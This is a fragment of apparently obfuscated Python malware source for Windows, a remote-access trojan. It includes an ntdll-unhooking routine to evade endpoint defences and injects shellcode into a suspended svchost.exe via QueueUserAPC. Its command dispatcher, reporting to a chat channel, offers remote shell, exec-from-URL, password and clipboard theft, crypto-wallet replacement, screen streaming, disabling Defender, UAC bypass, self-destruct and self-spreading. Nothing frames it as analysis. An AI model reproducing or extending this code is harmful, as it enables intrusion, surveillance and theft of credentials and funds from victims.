...
def _e():
    try:
        ...
        fresh=open(r'C:\Windows\System32\ntdll.dll','rb').read()
        base=ctypes.cast(ntdll,ctypes.c_void_p).value
        k32.VirtualProtect(base,len(fresh),0x40,ctypes.byref(ctypes.c_ulong()))
        ctypes.memmove(base,fresh,len(fresh))
...
def _o():
    sc=b'\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\xb0\x02\x48\xc1\xe0\x18\x48\x83\xc0\x60\x48\x89\xc1\x48\x83\xc1\x10\x48\x89\xe2\x48\x83\xc2\x20\x0f\x05\xc3'
    si=ctypes.create_string_buffer(ctypes.sizeof(ctypes.c_void_p)*4)
    pi=ctypes.create_string_buffer(ctypes.sizeof(ctypes.c_void_p)*4)
    ctypes.windll.kernel32.CreateProcessW(None,'C:\\Windows\\System32\\svchost.exe',None,None,False,0x00000004,None,None,ctypes.byref(si),ctypes.byref(pi))
    addr=ctypes.windll.kernel32.VirtualAllocEx(ctypes.c_void_p.from_buffer(pi).value,0,len(sc),0x3000,0x40)
    ctypes.windll.kernel32.WriteProcessMemory(ctypes.c_void_p.from_buffer(pi).value,addr,sc,len(sc),0)
    ctypes.windll.kernel32.QueueUserAPC(addr,ctypes.c_void_p.from_buffer(pi).value,0)
    ctypes.windll.kernel32.ResumeThread(ctypes.c_void_p.from_buffer(pi).value)
_o()
...
.setwallet <address> - Set replacement wallet''')
            elif a=='shell':_h._l(_h._ch["commands"],f'```{_af(arg)[:1900]}```')
            elif a=='ps':_h._l(_h._ch["commands"],f'```{_ay()[:1900]}```')
            elif a=='kill':_h._l(_h._ch["commands"],_ag(arg))
            elif a=='cd':_h._l(_h._ch["commands"],_ah(arg))
            elif a=='ls':_h._l(_h._ch["commands"],f'```{_ai(arg)[:1900]}```')
            elif a=='cat':_h._l(_h._ch["commands"],f'```{_aj(arg)[:1900]}```')
            elif a=='download':
                d=_ak(arg)
                ...
                else:_h._l(_h._ch["commands"],_al(sp[0],sp[1]))
            elif a=='exec':
                if not arg:_h._l(_h._ch["commands"],'Usage: .exec <url>')
                else:_h._l(_h._ch["commands"],_am(arg))
            elif a=='screenshot':
                s=_v()
            ...
            elif a=='clipboard':cb=_u();_h._l(_h._ch["commands"],f'Clipboard: {cb if cb else "(empty)"}')
            elif a=='sysinfo':_h._l(_h._ch["commands"],f'```{json.dumps(_s(),indent=2)[:1900]}```')
            elif a=='passwords':
                pwd=_p()
            ...
            elif a=='blockinput':_h._l(_h._ch["commands"],_ar())
            elif a=='unblockinput':_h._l(_h._ch["commands"],_as())
            elif a=='msg':
                sp=arg.split(maxsplit=1)
                if len(sp)<2:_h._l(_h._ch["commands"],'Usage: .msg <title> <text>')
                else:_h._l(_h._ch["commands"],_at(sp[0],sp[1]))
            elif a=='press':_h._l(_h._ch["commands"],_au(arg))
            elif a=='click':
                try:
                    x,y=map(int,arg.split())
                    _h._l(_h._ch["commands"],_av(x,y))
                except:_h._l(_h._ch["commands"],'Usage: .click <x> <y>')
            elif a=='type':_h._l(_h._ch["commands"],_aw(arg))
            elif a=='volume':
                try:
                    v=int(arg)
                    _h._l(_h._ch["commands"],_ax(v))
                except:_h._l(_h._ch["commands"],'Usage: .volume <0-100>')
            elif a=='shutdown':_h._l(_h._ch["commands"],_an())
            elif a=='restart':_h._l(_h._ch["commands"],_ao())
            elif a=='logoff':_h._l(_h._ch["commands"],_ap())
            elif a=='selfdestruct':_h._l(_h._ch["commands"],_be());sys.exit(0)
            elif a=='disabledefender':_h._l(_h._ch["commands"],_az())
            elif a=='uacbypass':_h._l(_h._ch["commands"],_ba())
            elif a=='stream':
                if arg=='start':
                    if '_st' not in dir():_st=_ae(_h);threading.Thread(target=_st.start,daemon=True).start();_h._l(_h._ch["commands"],'[+] Streaming started')
            ...
            elif a=='spread':_h._l(_h._ch["commands"],_bg())
